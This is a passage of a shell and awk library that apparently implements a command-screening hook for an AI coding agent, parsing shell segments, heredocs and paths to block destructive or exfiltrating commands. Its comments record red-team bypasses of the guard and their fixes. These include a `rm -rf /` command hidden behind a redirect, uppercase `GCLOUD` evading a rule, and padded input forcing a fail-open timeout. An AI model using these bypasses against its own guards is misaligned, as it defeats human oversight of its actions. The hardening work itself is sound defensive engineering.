  # Expand against the UN-peeled text: floor_peel strips a leading `NAME=value`
  # wrapper, which is exactly the assignment the expansion needs to see.
  _rawdata="$(printf '%s\n' "$_norm" | sed -n 's/^DATA://p')"
  _exp="$(floor_expand_vars "$_rawdata")"
  [ "$_exp" = "$_rawdata" ] || printf '%s\n' "$_exp"
  # Canonical-home variant, so path rules need only the absolute spelling.
  _hp="$(floor_expand_paths "$_exp")"
  [ "$_hp" = "$_exp" ] || printf '%s\n' "$_hp"
  printf '%s\n' "$_norm" | sed -n 's/^SUB://p'
  # EXPD renders substitutions back in place so a rule can see `eval $( ... )` adjacency (red-team pass 4).
  printf '%s\n' "$_norm" | sed -n 's/^EXPD://p'
  # VALU renders each substitution as a guess at its OUTPUT, so an operand arriving via `$(printf /)` still sits next to its verb (red-team pass 8).
  printf '%s\n' "$_norm" | sed -n 's/^VALU://p'
  # FEXEC: find's `-exec`/`-ok` children with `{}` substituted back to the search root (admission-normalize.awk, seg_expand_find), so the flat rules see what find runs.
  # ONE LINE PER CHILD: flat rules reach operands through a `[^;&|]*` span, and a span running into a synthesized operand would manufacture adjacency. The `case` runs first so a command with no find child costs no fork (a slow hook is skipped).
  case "$_norm" in
    *"FEXEC:"*)
      _fx="$(printf '%s\n' "$_norm" | sed -n 's/^FEXEC://p')"
      printf '%s\n' "$_fx"
      _fxe="$(floor_expand_paths "$_fx")"
      [ "$_fxe" = "$_fx" ] || printf '%s\n' "$_fxe" ;;
  esac
  if floor_is_executor "$_data"; then
    floor_peel "$(printf '%s\n' "$_norm" | sed -n 's/^CODE://p')"
    printf '\n'
  fi
}

# H2 (harbor#4) - THE PER-SESSION CONTEXT FILE. floor_session_context prints this session's recorded verdict, or empty. floor_engine_stand_down: exit 0 iff a GLOBAL-ENGINE hook must not act here.
# ONLY AN EXPLICIT OPT-OUT STANDS THE ENGINE DOWN (harbor#954, D-46): `worklog: off` at the top level of the .agents/config.yaml that floor_in_repo finds, honoured beside `context: ambient`. The session verdict no longer decides this.
floor_session_context() {
  _cx="$(floor_config_dir)/.helm-context"
  _sid="${1:-$(floor_field '.session_id')}"
  [ -n "$_sid" ] || return 0
  case "$_sid" in *[!A-Za-z0-9_-]*) return 0 ;; esac
  [ -f "$_cx/$_sid" ] || return 0
  # head -1, not cat: a reader must not be steered by anything appended below
  # the verdict line.
  head -n 1 "$_cx/$_sid" 2>/dev/null | tr -d '[:space:]' || true
}

floor_engine_stand_down() {
  floor_in_repo || :
  [ -n "$HARBOR_ADMISSION_MARKER_DIR" ] || return 1
  _wo="$HARBOR_ADMISSION_MARKER_DIR/.agents/config.yaml"
  { [ -f "$_wo" ] && [ ! -L "$_wo" ]; } || return 1
  # The `context:` reader's spelling rules: column 0, quotes and a spaced colon allowed, and a
  # comment needs whitespace before it. YAML 1.1 reads Off and OFF as the same boolean.
  "$FLOOR_GREP" -Eq \
    "^[\"']?worklog[\"']?[[:space:]]*:[[:space:]]*[\"']?[Oo][Ff][Ff][\"']?([[:space:]]+#.*)?[[:space:]]*\$" \
    "$_wo" 2>/dev/null
}

# THE SEGMENT-TABLE API (B-rewrite). A rule asks about ARGV (is some segment running `tar` in extract mode with an argument under the config dir?), not about spelling, which went wrong 60-85% as often as right.
# FAIL-OPEN, like every scanner here: with the awk missing, the payload oversized or the table empty, every predicate returns "no match"; B1's permissions.deny is the backstop.
#   floor_seg_load "$cmd"   # once per guard invocation
#   floor_seg_cmd '^(rm|shred)$'   # a segment runs this command
#   floor_seg_has '^tar$' '^-?[a-z]*x' '/\.claude'   # ...AND carries these args
#   floor_seg_redir '.' '/\.claude/'   # ...writes there via redirection
# Every pattern is an ERE on a WHOLE token. Argument patterns match arguments AND redirect targets (`tar -C ~/.claude` and `cat k > ~/.claude/x` are one concern).
floor_seg_load() { # <cmd>
  FLOOR_SEGS=""
  FLOOR_SEG_CMD="$1"  # harbor#798: the heredoc veto reads the command its table came from
  [ -f "$FLOOR_AWK" ] || return 0
  [ "${#1}" -gt "$FLOOR_MAX_NORM" ] && return 0
  # harbor#805: neutralize heredoc-body quotes so one cannot leak past the terminator (the veto
  # keeps FLOOR_SEG_CMD = the original, so delimiter quoting is still read as written).
  _slin="$1"; case "$1" in *'<<'*) _slin="$(floor_hd_literalize_bodies "$1")" ;; esac
  FLOOR_SEGS="$(printf '%s' "$_slin" | awk -f "$FLOOR_AWK" 2>/dev/null | "$FLOOR_GREP" '^SEG' || true)"
  return 0
}

# floor_seg_degraded - 0 iff floor_seg_load produced NO table, i.e. every floor_seg_* rule in the calling guard is silently absent for this call (harbor#306).
# floor_bash_targets degrades toward BLOCKING (raw scan) but floor_seg_load degrades to empty, which reads as "no match". A guard with both layers is covered by the flat layer; a segment-ONLY guard (the deny-always tiers of admission-destroy.sh and admission-cloud.sh) lost its whole rule set with exit 0 on a command over FLOOR_MAX_NORM, awk absent from PATH, or admission-normalize.awk missing.
# The predicate discriminates: every parseable call yields a non-empty table, so an empty one means "could not parse", never "nothing to see".
# It is NOT A RULE and must not become one: what to do belongs to the guard, whose tiers know which rules were load-bearing (ask-tier guards choose fail-open on purpose).
floor_seg_degraded() { [ -z "${FLOOR_SEGS:-}" ]; }

# _floor_seg_ids <cmd-ERE> - the ids of segments whose command matches.
# NOTE the `if` around every grep: `grep -q` returning 1 as the last command of a loop body kills the enclosing pipeline under `set -eu` (it truncated the B8 manifest, pass 11); the trap is one keystroke away in every function here.
# ONE grep over the whole SEGC block, not two processes PER SEGMENT (an 8KB payload took 38s, pass 12 P12-perf-04): latency is itself a fail-open bypass.
_floor_seg_ids() { # <cmd-ERE> [ci]
  # CASE-INSENSITIVITY IS OPT-IN (harbor#282): the blanket `-iE` was measured and rejected. This helper also resolves the shell segments floor_seg_shells_all_named_scripts counts, and one extra case-insensitive match (a heredoc commit message carrying `Read|Bash|Grep|WebFetch` made `|Bash` a shell segment) withdraws the harbor#222 exemption.
  # Callers meaning "a command NAME, however spelled" ask for `ci`; callers that COUNT SHELLS must not.
  _fsci=""; [ "${2:-}" = ci ] && _fsci="-i"
  # The anchors come off by parameter expansion, not $(printf | sed): two fewer processes per call (harbor#264).
  _fsre="${1#^}"; _fsre="${_fsre%\$}"
  "$FLOOR_GREP" $_fsci -E "^SEGC:[0-9]+:$_fsre\$" 2>/dev/null <<HARBOR_ADMISSION_SEG_EOF \
    | sed -n 's/^SEGC:\([0-9][0-9]*\):.*/\1/p' | sort -un | tr '\n' ' '
${FLOOR_SEGS:-}
HARBOR_ADMISSION_SEG_EOF
}

# _floor_seg_argtab — every segment's arguments and redirect targets, one per line, raw then in
# floor_expand_paths' spelling, in HARBOR_ADMISSION_SEG_TAB_ARGUMENTS, and the owning segment id of each line in
# HARBOR_ADMISSION_SEG_TAB_IDS (HARBOR_ADMISSION_SEG_TAB_N lines). Built once per FLOOR_SEGS (guard-bash appends fold rows,
# so the table is keyed on the whole string). Returns 1 when the expansion does not keep one line per
# argument, and floor_seg_has then takes its per-segment loop instead.
_floor_seg_argtab() {
  [ "${HARBOR_ADMISSION_SEG_TAB_KEY-x}" = "$FLOOR_SEGS" ] && return "${HARBOR_ADMISSION_SEG_TAB_RC:-1}"
  HARBOR_ADMISSION_SEG_TAB_KEY="$FLOOR_SEGS"; HARBOR_ADMISSION_SEG_TAB_RC=1
  _fta="$(printf '%s\n' "$FLOOR_SEGS" | awk '
    /^SEGA:/ { s = substr($0, 6); p = index(s, ":"); print substr(s, 1, p - 1); print "A" substr(s, p + 1); next }
    /^SEGR:/ { s = substr($0, 6); p = index(s, ":"); r = substr(s, p + 1); q = index(r, ":")
               print substr(s, 1, p - 1); print "A" substr(r, q + 1) }
    END { print "@"; print "A@END@" }')" || return 1
  _fti="$(printf '%s\n' "$_fta" | awk 'NR % 2')"
  _ftr="$(printf '%s\n' "$_fta" | awk 'NR % 2 == 0 { print substr($0, 2) }')"
  _fte="$(floor_expand_paths "$_ftr")"
  _ftn="$(printf '%s\n' "$_ftr" | awk 'END { print NR }')"
  [ "$_ftn" = "$(printf '%s\n' "$_fte" | awk 'END { print NR }')" ] || return 1
  case "$_ftr" in *'@END@') ;; *) return 1 ;; esac
  case "$_fte" in *'@END@') ;; *) return 1 ;; esac
  HARBOR_ADMISSION_SEG_TAB_IDS="$_fti
$_fti"
  HARBOR_ADMISSION_SEG_TAB_ARGUMENTS="$_ftr
$_fte"
  HARBOR_ADMISSION_SEG_TAB_N=$((_ftn * 2))
  HARBOR_ADMISSION_SEG_TAB_RC=0
  return 0
}

# floor_seg_has <cmd-ERE> [arg-ERE ...] - exit 0 iff SOME ONE segment matches the command AND carries an argument (or redirect target) for EVERY arg pattern. All patterns must hold of the SAME segment, which a flat scanner cannot express (`tar -tf a.tar; cp x ~/.claude`).
floor_seg_has() {
  [ -n "${FLOOR_SEGS:-}" ] || return 1
  _scre="$1"; shift
  # P13E-2: the per-segment loop forked ~6 times per matching segment, so padded input outran the hook timeout (which fails OPEN). The table path asks each arg pattern ONCE over every segment's arguments; the loop is the fallback when the table cannot be built consistently.
  if [ "$#" -gt 0 ] && _floor_seg_argtab; then
    _sids="$(_floor_seg_ids "$_scre" ci)"
    [ -n "$_sids" ] || return 1
    for _sre in "$@"; do
      _sids="$( { printf '%s\n' "$_sids"; printf '%s\n' "$HARBOR_ADMISSION_SEG_TAB_IDS"
                  printf '%s\n' "$HARBOR_ADMISSION_SEG_TAB_ARGUMENTS" | "$FLOOR_GREP" -nE -- "$_sre" 2>/dev/null | cut -d: -f1; } \
                | awk -v n="$HARBOR_ADMISSION_SEG_TAB_N" 'NR == 1 { k = split($0, c, " "); for (i = 1; i <= k; i++) C[c[i]] = 1; next }
                    NR <= n + 1 { ID[NR - 1] = $0; next }
                    { i = ID[$0 + 0]; if (i in C && !(i in O)) { O[i] = 1; printf "%s ", i } }')"
      [ -n "$_sids" ] || return 1
    done
    return 0
  fi
  # `ci` (harbor#282): every caller asks "does some segment RUN this command", and on a case-insensitive filesystem GCLOUD is gcloud (`GCLOUD projects delete` was ALLOWED). These guards are argv-only, with no case-insensitive twin to fall back on.
  for _sid in $(_floor_seg_ids "$_scre" ci); do
    _sargs="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_sid}://p"
              printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGR:${_sid}:[^:]*://p")"
    # Each token ALSO in its canonical-path spelling, so a rule needs only the absolute form. Every token is its own line, so this cannot fuse two arguments.
    _sexp="$(floor_expand_paths "$_sargs")"
    if [ "$_sexp" != "$_sargs" ]; then _sargs="$_sargs
$_sexp"; fi
    _sok=1
    for _sre in "$@"; do
      if printf '%s\n' "$_sargs" | "$FLOOR_GREP" -Eq -- "$_sre"; then :; else _sok=0; break; fi
    done
    if [ "$_sok" = 1 ]; then return 0; fi
  done
  return 1
}

# floor_seg_cmd <cmd-ERE> — exit 0 iff some segment runs a matching command.
floor_seg_cmd() { floor_seg_has "$1"; }

# floor_seg_redir <cmd-ERE> <target-ERE> — exit 0 iff a matching segment
# REDIRECTS to a matching target. Distinct from floor_seg_has because "writes
# there" and "mentions it" are different claims: `grep -n patch ~/.claude/x`
# names the path and writes nothing.
# _floor_hd_one_opener <cmd> (harbor#803) — 0 iff line 1 is ONE simple command whose only
# redirect is ONE heredoc (fd duplications open no file), its terminator line is found, and
# only blank lines follow it. The table cannot say which line a segment came from.
_floor_hd_one_opener() {
  printf '%s\n' "$1" | awk '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    NR == 1 {
      s = $0; L = length(s); p = 1; q = 0; nhd = 0
      while (p <= L) {
        c = substr(s, p, 1); nx = substr(s, p + 1, 1)
        if (q == 1) { if (c == "\047") q = 0; p++; continue }
        if (q == 2) {
          if (c == "\\") { p += 2; continue }
          if (c == "\"") q = 0
          else if (c == "`" || (c == "$" && (nx == "(" || nx == "["))) { bad = 1; exit }
          p++; continue
        }
        if (c == "\\") { if (p == L) { bad = 1; exit }; p += 2; continue }
        if (c == "\047") { q = 1; p++; continue }
        if (c == "\"") { q = 2; p++; continue }
        if (c ~ /[;|&()`]/ || (c == "$" && (nx == "(" || nx == "[" || nx == "\047"))) { bad = 1; exit }
        if (c == "#" && (p == 1 || substr(s, p - 1, 1) ~ /[ \t]/)) break
        if (c == "<" && nx == "<") {
          if (substr(s, p + 2, 1) == "<") { bad = 1; exit }
          nhd++; p += 2
          if (substr(s, p, 1) == "-") { DASH = 1; p++ }
          while (substr(s, p, 1) ~ /[ \t]/) p++
          dw = ""
          while (p <= L) {
            c = substr(s, p, 1)
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "$" || c == "`") { bad = 1; exit }
            if (c == "\\") { dw = dw substr(s, p + 1, 1); p += 2; continue }
            if (c == "\047" || c == "\"") {
              k = index(substr(s, p + 1), c); if (k == 0) { bad = 1; exit }
              dw = dw substr(s, p + 1, k - 1); p += k + 1; continue
            }
            dw = dw c; p++
          }
          if (dw == "") { bad = 1; exit }
          DL = dw; continue
        }
        if (c == "<" || c == ">") {
          t = substr(s, p)
          if (match(t, /^[<>]&([0-9]+|-)([ \t]|$)/)) { p += RLENGTH; continue }
          bad = 1; exit
        }
        p++
      }
      if (q != 0 || nhd != 1) { bad = 1; exit }
      next
    }
    !T { x = $0; if (DASH) sub(/^\t+/, "", x); if (x == DL) T = NR; next }
    $0 !~ /^[ \t]*$/ { bad = 1; exit }
    END { exit ((bad || !T) ? 1 : 0) }'
}

# floor_heredoc_inert_only (harbor#89) - 0 iff the WHOLE command is one INERT command consuming a heredoc, and nothing else. Deliberately narrow.
# WHY: a `git commit` whose message quoted a destructive command was blocked, and so was the issue filed about it; the guard was taxing its own documentation. WHY NOT "IGNORE HEREDOC BODIES": a body is data to `git commit -F -` and EXECUTABLE to `sh`; the tokenizer folds newlines to `;`, so the body becomes its own segment, and the two commands differ only by the consumer.
# STRICT because "every segment's command word is inert" is a BYPASS (`echo x > <floor surface>`): the danger is in the REDIRECT. So: EXACTLY one inert consumer, the body, and the delimiter as the LAST segment. Anything after it and the flat rules decide as before.
# FAIL-CLOSED: no table, no heredoc or an unrecognised consumer returns 1. The inert list is an ALLOWLIST.
# --publisher-inert (harbor#125): inertness is two questions. guard-bash asks "could this body be EXECUTED or written here"; guard-egress asks "could it LEAVE the box". `gh` answers NO to the first and YES to the second, so one flat list cannot serve both (`gh issue create --body-file -` was blocked while `git commit -F -` was allowed). guard-egress does NOT pass the flag and keeps the strict list (floor-test HEREDOC-1e pins it; passing the flag there turns it red).
# The subcommand is still checked: `gh alias set` stores a shell expansion that a later `gh <alias>` runs (harbor#125, #260). The flag admits `gh` only for text-consuming verbs, `alias` excluded by OMISSION, and an unrecognised verb falls through to the strict behaviour.
floor_heredoc_inert_only() {
  [ -n "${FLOOR_SEGS:-}" ] && [ -n "${FLOOR_SEG_CMD:-}" ] || return 1
  case "$FLOOR_SEG_CMD" in *'<<'*) ;; *) return 1 ;; esac  # a builtin gate: no heredoc, no fork
  # harbor#798: an UNQUOTED delimiter expands the body (POSIX 2.7.4), so its $(…) and
  # backticks RUN; that body is code, and the caller must judge it.
  floor_hd_body_expands "$FLOOR_SEG_CMD" && return 1
  # harbor#803: nothing but the consumer on line 1, nothing but blank lines after the body.
  _floor_hd_one_opener "$FLOOR_SEG_CMD" || return 1
  _hipub=0
  case "${1:-}" in --publisher-inert) _hipub=1 ;; esac
  printf '%s\n' "$FLOOR_SEGS" | awk -v PUB="$_hipub" '
    BEGIN { split("echo printf git jq yq true false :", IV, " ") }
    # A SYNTHESIZED SEGMENT IS NOT A POSITION IN THE COMMAND (P13-fs-06): find -exec children get ids above every parsed segment, so the delimiter-is-LAST test compared against a child the heredoc body merely describes (a false positive on a commit message documenting the shape). Skipped, not renumbered: the fold and the emitter depend on the ordering.
    # NO APOSTROPHES IN THIS BLOCK: the awk program is a single-quoted shell string, so one apostrophe inside a comment ends it and the shell re-parses the rest (this veto then returned 0). A comment is the one place prose can break the program.
    /^SEGF:/ { s = $0; sub(/^SEGF:/, "", s); sub(/:.*/, "", s); SYN[s + 0] = 1; next }
    # An eval body (harbor#786) is synthesized the same way, from a segment that
    # is itself a position: if that one follows the delimiter, the veto fails on it.
    /^SEGE:/ { s = $0; sub(/^SEGE:/, "", s); sub(/:.*/, "", s); SYN[s + 0] = 1; next }
    # So is a shell -c or env -S body (harbor#796); its parent on the opener line is refused
    # by the shape check, and after the terminator it is a parsed segment the veto fails on.
    /^SEGI:/ { s = $0; sub(/^SEGI:/, "", s); sub(/:.*/, "", s); SYN[s + 0] = 1; next }
    /^SEGC:/ {
      i = $0; sub(/^SEGC:/, "", i); n = i; sub(/:.*/, "", n)
      v = $0; sub(/^SEGC:[0-9]+:/, "", v)
      if (SYN[n + 0]) next
      C[n + 0] = v; if (n + 0 > MAX) MAX = n + 0
    }
    # Only a heredoc opened by the FIRST segment counts. `<<`, NOT `<` (pass 13, TOK-heredoc-inert-01, critical): the tokenizer once emitted the same SEGR row for a heredoc and a plain input redirect, so `jq . < README ; rm -rf / ; README` satisfied every clause and exited guard-bash 0. admission-normalize.awk now distinguishes the operators.
    /^SEGR:1:<<:/ { D = $0; sub(/^SEGR:1:<<:/, "", D) }
    /^SEGR:1:/ { R1++ }
    /^SEGW:1:/ { W1 = $0; sub(/^SEGW:1:/, "", W1) }
    # Segment 1 arguments, in order, for the publisher-inert subcommand check.
    /^SEGA:1:/ { a = $0; sub(/^SEGA:1:/, "", a); A[++AN] = a }
    END {
      if (D == "" || MAX < 2) exit 1
      # harbor#803: the first word IS the consumer (no assignment or wrapper configures
      # it), and its one redirect is the heredoc.
      if (W1 != C[1] || R1 != 1) exit 1
      w = C[1]; sub(/.*\//, "", w)
      ok = 0; for (k in IV) if (w == IV[k]) ok = 1
      # harbor#803: git is inert only for its document verbs, and never under -c,
      # --config-env or --exec-path, which choose what it runs. yq -i and -s write files.
      if (w == "git") {
        sc = ""
        for (q = 1; q <= AN; q++) {
          if (A[q] ~ /^(-c|--config-env|--exec-path)/) exit 1
          if (A[q] == "-C") { q++; continue }
          if (substr(A[q], 1, 1) == "-") continue
          sc = A[q]; break
        }
        if (sc !~ /^(commit|tag|notes)$/) exit 1
      }
      if (w == "yq") for (q = 1; q <= AN; q++) if (A[q] ~ /^(-[a-zA-Z]*[is]|--inplace|--split-exp)/) exit 1
      # A PUBLISHER IS INERT ONLY TO THE GUARD THAT DOES NOT JUDGE PUBLICATION, and only for a verb that consumes text (the first non-flag argument). NO APOSTROPHES IN THIS BLOCK.
      if (!ok && PUB == 1 && w == "gh") {
        split("issue pr release gist", PV, " ")
        for (q = 1; q <= AN; q++) {
          if (substr(A[q], 1, 1) == "-") continue
          for (r in PV) if (A[q] == PV[r]) ok = 1
          break
        }
      }
      if (!ok) exit 1
      # NOTHING FOLLOWS THE HEREDOC is decided on the RAW command by _floor_hd_one_opener (harbor#803), not on the segment table: the old last-segment-is-the-delimiter test read the body as shell, so a lone apostrophe in a commit message swallowed the terminator and turned the veto OFF (harbor#805).
      exit 0
    }'
}

# floor_hd_drop_doc_bodies [--writers] <cmd> — <cmd> without the body of each LEADING
# document heredoc (harbor#716): the opener line is one simple command run by git
# commit|tag|notes, gh issue|pr|release|gist, jq, yq, echo, printf, true, false, :
# (and cat, tee with --writers). Anything else comes back unchanged. docs/explanation/admission-baseline.md has the rule.
floor_hd_drop_doc_bodies() {
  _hdbw=0; _hdbp=0
  while :; do
    case "${1:-}" in --writers) _hdbw=1; shift ;; --pipes) _hdbp=1; shift ;; *) break ;; esac
  done
  case "$1" in *'<<'*) ;; *) printf '%s' "$1"; return 0 ;; esac
  _hdbo="$(printf '%s\n' "$1" | awk -v W="$_hdbw" -v P="$_hdbp" '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    function pushw() {
      if (inw) { if (rt) rt = 0; else WD[++NW] = cw }
      cw = ""; inw = 0
    }
    # harbor#302 --pipes: stage k (k >= 2) of the opener pipeline may only be a consumer whose
    # stdin cannot run: wc, head, tail, or gh/git on a document verb. Stage 1 is cat alone.
    function stage_ok(a, z,   k, sc) {
      if (WD[a] ~ /[\/=]/) return 0
      if (WD[a] ~ /^(wc|head|tail)$/) return 1
      if (WD[a] != "gh" && WD[a] != "git") return 0
      sc = ""
      for (k = a + 1; k <= z; k++) {
        if (WD[a] == "git" && WD[k] ~ /^(-c|--config-env|--exec-path|-C)/) return 0
        if (WD[a] == "git" && WD[k] ~ /^!/) return 0
        if (WD[k] ~ /^-/) continue
        sc = WD[k]; break
      }
      if (WD[a] == "git") return (sc ~ /^(commit|tag|notes)$/)
      return (sc ~ /^(issue|pr|release|gist)$/)
    }
    # 1 iff s is a strippable opener; sets DL (delimiter), DASH, OS and OE.
    function opener(s,   L, p, c, nx, q, nhd, dw, dq, k, sub1) {
      L = length(s); p = 1; q = 0; nhd = 0; NW = 0; cw = ""; inw = 0; rt = 0; NS = 0; hdst = 0
      split("", WD); split("", STG)
      while (p <= L) {
        c = substr(s, p, 1); nx = substr(s, p + 1, 1)
        if (q == 1) { if (c == "\047") q = 0; else cw = cw c; p++; continue }
        if (q == 2) {
          if (c == "\\" && nx ~ /[$`"\\]/) { cw = cw nx; p += 2; continue }
          if (c == "\"") { q = 0; p++; continue }
          if (c == "`" || (c == "$" && nx == "(")) return 0
          cw = cw c; p++; continue
        }
        if (c == "\\") { if (p == L) return 0; cw = cw nx; inw = 1; p += 2; continue }
        if (c == "\047") { q = 1; inw = 1; p++; continue }
        if (c == "\"") { q = 2; inw = 1; p++; continue }
        if (c == "`" || c == "(" || c == ")" || c == ";") return 0
        if (c == "$" && nx == "(") return 0
        if (c == "#" && !inw) break
        if (c == " " || c == "\t") { pushw(); p++; continue }
        if (c == "|") {
          if (!P || nx == "|" || nx == "&") return 0
          pushw(); STG[++NS] = NW + 1; p++; continue
        }
        if (c == "&" && nx != ">") return 0
        if (c == "<" && substr(s, p, 3) == "<<<") return 0
        if (c == "<" && nx == "<") {
          pushw(); nhd++; OS = p; hdst = NS; p += 2; DASH = 0
          if (substr(s, p, 1) == "-") { DASH = 1; p++ }
          while (substr(s, p, 1) == " " || substr(s, p, 1) == "\t") p++
          dw = ""; dq = 0
          while (p <= L) {
            c = substr(s, p, 1); nx = substr(s, p + 1, 1)
            if (dq == 1) { if (c == "\047") dq = 0; else dw = dw c; p++; continue }
            if (dq == 2) {
              if (c == "\\" && nx ~ /[$`"\\]/) { dw = dw nx; p += 2; continue }
              if (c == "\"") dq = 0; else dw = dw c
              p++; continue
            }
            if (c == "\047") { dq = 1; p++; continue }
            if (c == "\"") { dq = 2; p++; continue }
            if (c == "\\") { if (p == L) return 0; dw = dw nx; p += 2; continue }
            if (c ~ /[ \t;&|<>()]/) break
            if (c == "`" || (c == "$" && nx == "(")) return 0
            dw = dw c; p++
          }
          if (dq != 0 || dw == "") return 0
          DL = dw; OE = p - 1; continue
        }
        if (P && (c == ">" || c == "<" || c == "&")) return 0
        if (c == ">" || c == "<" || c == "&") {
          # a redirect: a bare fd number before it is part of the operator,
          # and the word after it is its target, never a command word
          if (inw && cw ~ /^[0-9]+$/) { cw = ""; inw = 0 } else pushw()
          while (p <= L && substr(s, p, 1) ~ /[<>&|]/) p++
          rt = 1; continue
        }
        cw = cw c; inw = 1; p++
      }
      if (q != 0) return 0
      pushw()
      if (nhd != 1 || NW == 0) return 0
      if (P) {
        if (NS == 0 || hdst != 0 || WD[1] != "cat") return 0
        for (k = 1; k <= NS; k++) {
          if (STG[k] > NW || !stage_ok(STG[k], (k < NS) ? STG[k + 1] - 1 : NW)) return 0
        }
        return 1
      }
      c = WD[1]
      if (c ~ /[\/=]/) return 0
      if (c ~ /^(jq|yq|echo|printf|true|false|:)$/) return 1
      if (c ~ /^(cat|tee)$/) return (W == 1)
      sub1 = ""
      for (k = 2; k <= NW; k++) {
        if (c == "git" && WD[k] == "-C") { k++; continue }
        if (c == "git" && WD[k] ~ /^(-c|--config-env|--exec-path)/) return 0
        if (WD[k] ~ /^-/) continue
        sub1 = WD[k]; break
      }
      if (c == "git") {
        for (k = 2; k <= NW; k++) if (WD[k] ~ /^!/) return 0
        return (sub1 ~ /^(commit|tag|notes)$/)
      }
      if (c == "gh") return (sub1 ~ /^(issue|pr|release|gist)$/)
      return 0
    }
    { LN[++N] = $0 }
    END {
      i = 1; o = ""; sep = ""
      while (i <= N) {
        if (LN[i] == "") { o = o sep; sep = "\n"; i++; continue }
        if (!opener(LN[i])) break
        t = 0
        for (j = i + 1; j <= N; j++) {
          x = LN[j]; if (DASH) sub(/^\t+/, "", x)
          if (x == DL) { t = j; break }
        }
        if (!t) break
        o = o sep substr(LN[i], 1, OS - 1) " " substr(LN[i], OE + 1); sep = "\n"
        i = t + 1
      }
      for (; i <= N; i++) { o = o sep LN[i]; sep = "\n" }
      printf "%s", o
    }' 2>/dev/null)" || _hdbo=""
  if [ -n "$_hdbo" ]; then printf '%s' "$_hdbo"; else printf '%s' "$1"; fi
}

# floor_hd_unwrap_doc_bodies [--writers] <cmd> - like floor_hd_drop_doc_bodies, but also drops the body of a document heredoc behind ONE envelope (harbor#782): a compound opener (`mkdir ... && cat > f <<EOF`) or the `<enclosing> ... $(cat <<EOF)` argument form. It only PEELS the envelope off line 1 and delegates the heredoc parsing to floor_hd_drop_doc_bodies (admission-baseline.md has the rule).
# Safe because a compound prefix never touches the body and the delegate re-checks the consumer (`x && bash <<EOF` stays judged). The `$(cat <<EOF)` arm peels ONLY when the enclosing command word is on the allowlist, so `sh -c "$(...)"` and `eval "$(...)"` keep blocking. A mis-split leaves an unbalanced remainder the delegate refuses.
floor_hd_unwrap_doc_bodies() {
  _huw=0
  if [ "${1:-}" = --writers ]; then _huw=1; shift; fi
  _hu="$1"
  case "$_hu" in *'<<'*) ;; *) printf '%s' "$_hu"; return 0 ;; esac
  # A body the shell expands and runs is code, never a document (see below).
  if floor_hd_body_expands "$_hu"; then printf '%s' "$_hu"; return 0; fi
  # A LEADING document heredoc is the delegate's own case; if it strips, we are done.
  if [ "$_huw" = 1 ]; then _hul="$(floor_hd_drop_doc_bodies --writers "$_hu")"
  else _hul="$(floor_hd_drop_doc_bodies "$_hu")"; fi
  [ "$_hul" = "$_hu" ] || { printf '%s' "$_hul"; return 0; }
  [ -f "$FLOOR_AWK" ] || { printf '%s' "$_hu"; return 0; }
  # Classify line 1 and emit the split. Both fields are single lines (line 1 only).
  _husp="$(printf '%s\n' "$_hu" | _HU_W="$_huw" awk -v W="$_huw" '
    # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
    function firstword(s,   i, c, q, w) {
      q = 0; w = ""
      for (i = 1; i <= length(s); i++) {
        c = substr(s, i, 1)
        if (q == 1) { if (c == "\047") q = 0; else w = w c; continue }
        if (q == 2) { if (c == "\"") q = 0; else w = w c; continue }
        if (c == "\047") { q = 1; continue }
        if (c == "\"") { q = 2; continue }
        if (c == " " || c == "\t") { if (w != "") return w; else continue }
        w = w c
      }
      return w
    }
    function consumer_first(w) {
      sub(/.*\//, "", w)
      return (w ~ /^(jq|yq|echo|printf|true|false|:)$/) || (W == 1 && w ~ /^(cat|tee)$/)
    }
    NR == 1 {
      L = $0; n = length(L)
      fw = firstword(L); fwb = fw; sub(/.*\//, "", fwb)
      q1 = 0; depth = 0; hd0 = 0; hdsub = 0; lastsep = 0; subpos = 0; PIPE = 0; i = 1
      while (i <= n) {
        c = substr(L, i, 1); nx = substr(L, i + 1, 1)
        if (q1 == 1) { if (c == "\047") q1 = 0; i++; continue }
        if (c == "\047") { q1 = 1; i++; continue }
        if (c == "\\") { i += 2; continue }
        if (c == "$" && nx == "(") { if (depth == 0 && subpos == 0 && hd0 == 0) subpos = i + 2; depth++; i += 2; continue }
        if (c == "(") { depth++; i++; continue }
        if (c == ")") { if (depth > 0) depth--; i++; continue }
        if (c == "<" && substr(L, i, 3) == "<<<") { i += 3; continue }
        if (c == "<" && nx == "<") {
          if (depth == 0) { if (hd0 == 0) hd0 = i } else { if (subpos > 0 && hdsub == 0) hdsub = i }
          i += 2; continue
        }
        if (depth == 0) {
          if (c == "|" && nx == "|") { lastsep = i + 2; i += 2; continue }
          if (c == "|") { PIPE = 1; i++; continue }
          if (c == "&" && nx == "&") { lastsep = i + 2; i += 2; continue }
          if (c == "&") { i++; continue }
          if (c == ";") { lastsep = i + 1; i++; continue }
        }
        i++
      }
      if (hd0 > 0 && lastsep > 0 && lastsep < hd0 && !PIPE && subpos == 0) {
        printf "PFX:%s\n", substr(L, 1, lastsep); printf "RL1:%s\n", substr(L, lastsep + 1); next
      }
      if (subpos > 0 && hdsub > 0 && !PIPE) {
        ok = consumer_first(fw)
        if (!ok && fwb == "git") { if (L ~ /(^|[^[:alnum:]_])git([[:space:]]+-[^[:space:]]+)*[[:space:]]+(commit|tag|notes)([[:space:]]|$)/) ok = 1 }
        if (!ok && fwb == "gh")  { if (L ~ /(^|[^[:alnum:]_])gh([[:space:]]+-[^[:space:]]+)*[[:space:]]+(issue|pr|release|gist)([[:space:]]|$)/) ok = 1 }
        if (ok) { printf "PFX:%s\n", substr(L, 1, subpos - 1); printf "RL1:%s\n", substr(L, subpos); next }
      }
    }' 2>/dev/null || true)"
  case "$_husp" in PFX:*) ;; *) printf '%s' "$_hu"; return 0 ;; esac
  _hupfx="$(printf '%s\n' "$_husp" | sed -n 's/^PFX://p')"
  _hurl1="$(printf '%s\n' "$_husp" | sed -n 's/^RL1://p')"
  _hutail="$(printf '%s' "$_hu" | sed '1d')"
  if [ -n "$_hutail" ]; then _hurem="$_hurl1
$_hutail"; else _hurem="$_hurl1"; fi
  if [ "$_huw" = 1 ]; then _hustr="$(floor_hd_drop_doc_bodies --writers "$_hurem")"
  else _hustr="$(floor_hd_drop_doc_bodies "$_hurem")"; fi
